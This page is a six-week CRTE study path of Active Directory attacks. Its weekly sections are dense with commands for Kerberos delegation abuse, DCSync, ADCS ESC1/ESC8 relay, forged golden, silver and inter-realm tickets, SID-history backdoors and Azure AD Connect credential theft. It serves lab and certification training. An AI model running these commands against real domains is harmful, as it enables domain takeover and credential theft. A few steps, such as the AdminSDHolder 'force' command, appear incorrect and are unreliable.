---
layout: training-page
title: "CRTE Preparation Path (6 Weeks) — Red Team Academy"
module: "Learning Paths"
tags:
  - crte
  - learning-path
  - certification
  - active-directory
  - forest-trusts
  - adcs
  - kerberos
page_key: "learning-paths-crte-prep"
render_with_liquid: false
---

# CRTE Preparation Path — 6 Weeks

The Certified Red Team Expert (CRTE) from Altered Security (Nikhil Mittal / pentesteracademy) is the advanced Active Directory certification. Where CRTO focuses on Cobalt Strike tradecraft and operational red teaming, CRTE focuses on understanding and exploiting every attack surface that AD exposes — from Kerberos delegation to ADCS certificate abuse to forest trust attacks.

This path assumes you have completed CRTO or have equivalent AD attack experience. It is not a beginner path.

---

## CRTE Exam Overview

| Parameter | Detail |
|---|---|
| Duration | Multi-day practical lab exam |
| Format | Windows AD lab, flag-based objectives |
| Environment | Multi-forest, multi-domain, ADCS, SQL server |
| Prerequisite knowledge | Advanced Kerberos, BloodHound, PowerView |
| Report | Optional detailed report for extra recognition |

The CRTE lab environment is significantly more complex than CRTO. You will encounter:
- Multiple AD forests with trust relationships
- Active Directory Certificate Services (ADCS)
- SQL servers with linked server chains
- Complex Kerberos delegation chains (constrained, unconstrained, resource-based)
- ACL abuse paths requiring multiple pivots

---

## Prerequisites Checklist

Before starting week 1:
- [ ] Completed CRTO or equivalent AD red team experience
- [ ] Can enumerate and exploit Kerberoastable accounts from memory
- [ ] Understands Kerberos TGT/TGS flow conceptually
- [ ] Has used BloodHound to identify attack paths
- [ ] Comfortable with PowerView and Rubeus tooling
- [ ] Has performed a DCSync at least once in a lab environment

**If any of these are uncertain, complete the CRTO path first.**

---

## Week 1: Advanced Active Directory Enumeration

**Goal:** Build a comprehensive picture of a complex AD environment — multiple domains, trusts, delegations, ADCS, and SQL servers.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/active-directory/ad-enumeration](/active-directory/ad-enumeration) | Full enumeration methodology, PowerView, ldapdomaindump, LDAP queries |
| [/active-directory/bloodhound](/active-directory/bloodhound) | Advanced BloodHound queries, custom Cypher queries |
| [/active-directory/domain-trusts](/active-directory/domain-trusts) | Trust enumeration, trust types, attack surfaces |

### Advanced PowerView Enumeration

```powershell
# Enumerate all domains in the forest
Get-NetForestDomain

# Get all trusts in the forest
Get-NetForestTrust
Get-NetDomainTrust

# Enumerate foreign users (users from trusted domains in this domain's groups)
Get-NetGroupMember -GroupName "Domain Admins" | Where-Object { $_.MemberObjectClass -eq "user" }

# ACL enumeration — who has rights over Domain Admins
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "Write|Full" }

# Find computers with unconstrained delegation
Get-NetComputer -Unconstrained | select dnshostname

# Find computers with constrained delegation
Get-NetComputer -TrustedToAuth | select dnshostname, msds-allowedtodelegateto

# ADCS enumeration
certutil -ca.config "CA_Server\CA_Name" -ping
Get-DomainObject -LDAPFilter "(objectClass=pKIEnrollmentService)"
```

### Advanced BloodHound Cypher Queries

```cypher
// Find all principals with DCSync rights
MATCH p=(n)-[r:GetChanges|GetChangesAll*1..]->(d:Domain) RETURN p

// Find unconstrained delegation computers (not DCs)
MATCH (c:Computer {unconstraineddelegation:true}) WHERE c.name <> "DC01.DOMAIN.LOCAL" RETURN c

// Find RBCD opportunities
MATCH p=(u)-[:WriteAccountRestrictions]->(c:Computer) RETURN p

// Cross-domain attack paths
MATCH p=shortestPath((g:Group)-[*1..]->(d:Domain {name:"TARGET.DOMAIN.LOCAL"})) 
WHERE g.domain = "SOURCE.DOMAIN.LOCAL" RETURN p

// Find users with shadow credentials rights
MATCH p=(u)-[:AddKeyCredentialLink]->(t) RETURN p
```

### Domain Trust Types and Attack Surfaces

| Trust Type | Direction | Attack Surface |
|---|---|---|
| Parent-Child | Bidirectional (transitive) | SID history injection, forged cross-realm TGT |
| External | Unidirectional or bidirectional | SID filtering bypass (if not enforced) |
| Forest | Bidirectional (if full forest trust) | Cross-forest Kerberoasting, trust account abuse |
| Shortcut | Bidirectional | Faster path, same attacks as parent-child |
| MIT | Bidirectional | Rare, usually Kerberos cross-realm |

---

## Week 2: Kerberos Deep Attacks

**Goal:** Understand and exploit every major Kerberos attack — not just the common ones, but delegation, constrained delegation, RBCD, and cross-realm forgery.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/active-directory/kerberoasting](/active-directory/kerberoasting) | Advanced targeting, cracking optimization, AS-REP variant |
| [/active-directory/kerberos-delegation](/active-directory/kerberos-delegation) | Unconstrained, constrained, RBCD — full breakdown |
| [/active-directory/asreproasting](/active-directory/asreproasting) | AS-REP roasting, identifying targets, offline cracking |

### Kerberos Authentication Flow (Required Knowledge)

```
1. Client → KDC (AS-REQ): "Give me a TGT" (pre-auth: encrypted timestamp with user hash)
2. KDC → Client (AS-REP): TGT encrypted with krbtgt hash + Session Key encrypted with user hash
3. Client → KDC (TGS-REQ): "Give me a TGS for SPN X" (sends TGT)
4. KDC → Client (TGS-REP): TGS encrypted with target service's NTLM hash
5. Client → Service (AP-REQ): TGS presented to service
```

**Kerberoasting** attacks step 4 — the TGS is encrypted with the service account's hash, which can be cracked offline.
**AS-REP Roasting** attacks step 2 — if pre-auth is disabled, the AS-REP can be captured without credentials.

### Unconstrained Delegation Attack

Computers with unconstrained delegation store TGTs from any authenticating user. If you compromise such a machine:

```powershell
# Check for unconstrained delegation computers
Get-NetComputer -Unconstrained

# On the compromised unconstrained delegation server:
# Trigger authentication from a high-value target (printer bug / SpoolSample)
.\SpoolSample.exe <DC_IP> <delegation_server_IP>

# Capture the TGT from memory
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Or use Rubeus
.\Rubeus.exe monitor /interval:5 /nowrap

# Pass the ticket (use the DC's TGT)
.\Rubeus.exe ptt /ticket:<base64_TGT>

# Now DCSync with DC's machine account TGT
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'
```

### Resource-Based Constrained Delegation (RBCD)

RBCD allows a resource (e.g., a computer) to specify which accounts can delegate to it. If you have `Write` permissions over a computer object's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute:

```powershell
# Step 1: Create a fake computer account you control
.\Powermad.ps1; New-MachineAccount -MachineAccount AttackerPC -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Step 2: Get SID of the fake computer
$SID = Get-NetComputer -Identity AttackerPC -Properties objectsid | select -expand objectsid

# Step 3: Configure RBCD on the target
Set-DomainObject -Identity <target_computer> -Set @{"msds-allowedtoactonbehalfofotheridentity"=(New-Object Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID)"))}

# Step 4: Get a S4U2Self ticket to impersonate Domain Admin
.\Rubeus.exe s4u /user:AttackerPC$ /rc4:<NTLM_of_AttackerPC> /impersonateuser:Administrator /msdsspn:cifs/<target_computer> /ptt
```

### Cross-Realm Kerberoasting

If a forest trust exists and `\$InterRealm KRB5` tickets are issued without SID filtering:
```powershell
# Enumerate SPNs in trusted domain from current domain
Get-NetUser -Domain trusted.domain.local -SPN | select samaccountname, serviceprincipalname

# Request cross-domain TGS
.\Rubeus.exe kerberoast /domain:trusted.domain.local /dc:<trusted_DC_IP> /nowrap
```

---

## Week 3: ADCS and Credential Attacks

**Goal:** Exploit Active Directory Certificate Services misconfigurations and extract credentials from multiple AD sources.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/active-directory/adcs-attacks](/active-directory/adcs-attacks) | ESC1–ESC8 template abuses, certificate persistence |
| [/active-directory/ntds-dumping](/active-directory/ntds-dumping) | NTDS.dit extraction methods, VSS, DRSUAPI, ntdsutil |
| [/active-directory/dcsync](/active-directory/dcsync) | DCSync prerequisites, execution, detection considerations |

### ADCS Enumeration and Attack Selection

```powershell
# Enumerate with Certify
.\Certify.exe find /vulnerable

# Enumerate with certipy (Linux)
certipy find -u <user>@domain.local -p <pass> -dc-ip <DC_IP> -vulnerable
```

### ESC1 — Misconfigured Certificate Template (Most Common)

**Conditions:** Enrollee supplies subject (SAN), no manager approval, enrollment rights to low-priv users

```powershell
# Request a certificate as Domain Admin via SAN
.\Certify.exe request /ca:CA01\CORP-CA /template:VulnerableTemplate /altname:Administrator

# Convert to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx

# Authenticate with the certificate (get NTLM hash via PKINIT)
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:password /nowrap
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:password /getcredentials  # Get NTLM
```

### ESC8 — NTLM Relay to ADCS HTTP Enrollment Endpoint

```bash
# Set up relay
impacket-ntlmrelayx -t http://<CA_server>/certsrv/certfnsh.asp --adcs --template DomainController

# Trigger authentication (coerce DC)
.\PetitPotam.exe <attacker_IP> <DC_IP>

# Use the base64 certificate
.\Rubeus.exe asktgt /user:<DC_machine_account>$ /certificate:<base64_cert> /dc:<DC_IP> /getcredentials
```

### NTDS.dit Extraction Methods

| Method | Requires | Detection |
|---|---|---|
| DCSync | Replication rights (DA or DCSync ACL) | Event ID 4662 + mimikatz signature |
| VSS (ntdsutil) | DA + interactive session on DC | Low |
| VSS (manual) | Admin on DC | Low |
| Volume Shadow Copy | Admin on DC | Medium |

```powershell
# DCSync via Mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.local /all /csv"'

# DCSync via Impacket (from Linux)
impacket-secretsdump <DOMAIN>/<DA_user>:<password>@<DC_IP> -just-dc

# NTDS via ntdsutil shadow copy
ntdsutil "ac i ntds" "ifm" "create full C:\ntdsbackup" q q
# Then copy ntds.dit + SYSTEM hive
```

---

## Week 4: Lateral Movement and Persistence

**Goal:** Move laterally through complex multi-domain environments and establish persistent access that survives reboots and credential resets.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/active-directory/ad-persistence](/active-directory/ad-persistence) | Golden ticket, Silver ticket, Diamond ticket, skeleton key |
| [/post-exploitation/dcom-lateral](/post-exploitation/dcom-lateral) | DCOM lateral movement, MSHTA, MMC20 |
| [/post-exploitation/wmi-lateral](/post-exploitation/wmi-lateral) | WMI subscriptions for persistence + lateral movement |

### Golden Ticket vs Diamond Ticket vs Silver Ticket

| Ticket Type | Forged using | Target | Detection |
|---|---|---|---|
| Golden Ticket | krbtgt NTLM hash | Any service in domain | Hard — valid KDC signature |
| Silver Ticket | Service account hash | Specific service only | Harder — no KDC involvement |
| Diamond Ticket | krbtgt hash (modifies real TGT) | Any service | Harder than Golden |

```powershell
# Golden Ticket
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:<domain_SID> /krbtgt:<krbtgt_NTLM> /id:500 /ptt"'

# Diamond Ticket (more OPSEC safe — builds on a real TGT)
.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512

# Silver Ticket (for specific service only — no logon events at DC)
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:<domain_SID> /target:<server_fqdn> /service:cifs /rc4:<service_hash> /ptt"'
```

### AD Persistence — SID History

```powershell
# Add Enterprise Admins SID to a user in child domain
# This grants rights in the parent domain
Invoke-Mimikatz -Command '"misc::addsid /user:backdoor_user /sids:S-1-5-21-<root_domain>-519"'
```

---

## Week 5: Forest Trust Attacks and Cross-Forest Enumeration

**Goal:** Exploit inter-forest trust relationships to pivot from one forest to another.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/active-directory/domain-trusts](/active-directory/domain-trusts) | Forest trust types, SID filtering, trust key abuse |
| [/active-directory/acl-abuse](/active-directory/acl-abuse) | Cross-domain ACL abuse, AdminSDHolder abuse |
| [/active-directory/sccm-attacks](/active-directory/sccm-attacks) | SCCM credential dumping, relay attacks via SCCM |

### Inter-Forest Trust Exploitation

If there is a bidirectional forest trust with SID filtering disabled (or if you have `Enterprise Admins` in one forest):

```powershell
# Get trust key for cross-forest TGT forgery
Invoke-Mimikatz -Command '"lsadump::trust /patch"'

# Forge inter-realm TGT
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:source.local /sid:<source_SID> /sids:<target_domain_EA_SID> /rc4:<trust_key> /service:krbtgt /target:target.local /ptt"'

# Request TGS in target forest
.\Rubeus.exe asktgs /ticket:<base64_forged_TGT> /dc:<target_DC> /service:cifs/<target_server> /ptt
```

### AdminSDHolder Abuse

AdminSDHolder is a template applied to protected accounts (DA, EA, etc.). If you have `WriteDACL` on the AdminSDHolder object:
```powershell
# Grant yourself GenericAll on AdminSDHolder
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All

# Wait for SDProp to run (every 60 min) — or force it
Invoke-Mimikatz -Command '"misc::addsid"'
```

---

## Week 6: Azure AD Integration Attacks

**Goal:** Extend AD attack skills into Azure AD / Entra ID environments where on-prem AD syncs to the cloud.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/active-directory/azure-ad](/active-directory/azure-ad) | Azure AD architecture, Connect sync, Seamless SSO |
| [/active-directory/azure-privilege-escalation](/active-directory/azure-privilege-escalation) | Azure roles, service principals, managed identities |
| [/active-directory/m365-attacks](/active-directory/m365-attacks) | Teams/SharePoint/Exchange attacks, OAuth abuse |

### Azure AD Connect Attack

Azure AD Connect synchronizes on-prem AD to Azure. The sync account (MSOL_) has DCSync-equivalent rights:

```powershell
# Get credentials from Azure AD Connect database
# Run on the server running AAD Connect
.\Get-AADIntAzureADConnectAccessToken -Verbose
# Or use adconnectdump
.\ADConnectDump.exe

# Once you have MSOL_ credentials → DCSync on-prem AD
impacket-secretsdump DOMAIN/MSOL_<hash>@DC_IP
```

### Seamless SSO Attack

Azure Seamless SSO creates a computer account (AZUREADSSOACC$) whose Kerberos key can forge Silver Tickets that authenticate to Azure AD:
```powershell
# Get AZUREADSSOACC$ hash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:AZUREADSSOACC$"'

# Forge Silver Ticket for Azure AD
# Use the NTLM hash to forge ticket authenticating to Kerberos realm aadg.windows.net
```

### Key CRTE Exam Study Topics Summary

| Topic | Depth Required | Key Tools |
|---|---|---|
| BloodHound Cypher queries | Deep | BloodHound |
| Kerberos delegation (all 3 types) | Deep | Rubeus, Mimikatz |
| ADCS ESC1–ESC8 | Medium–Deep | Certify, Certipy |
| Domain trust attacks | Deep | Mimikatz, Rubeus |
| Forest trust exploitation | Medium | Mimikatz |
| RBCD attacks | Deep | PowerMad, Rubeus |
| SID history injection | Medium | Mimikatz |
| Azure AD Connect abuse | Medium | ADConnectDump |
| SCCM attacks | Basic | Misconfiguration-dependent |

---

## CRTE Resources

| Resource | Type | Notes |
|---|---|---|
| Altered Security CRTE Course | Official | Required — includes lab access |
| AD Security Blog (Sean Metcalf) | Reference | adsecurity.org — comprehensive Kerberos/AD |
| SpecterOps BloodHound edge documentation | Reference | Every BloodHound edge explained |
| Harmj0y blog | Blog | Kerberos attacks, PowerView, many CRTE topics |
| Will Schroeder / Charlie Clark talks | Conference talks | ADCS attacks, Kerberos deep dives |
| Rubeus GitHub | Tool reference | All flags documented |
| CRTE Exam Prep GitHub (community) | Notes | Community study notes and walkthroughs |
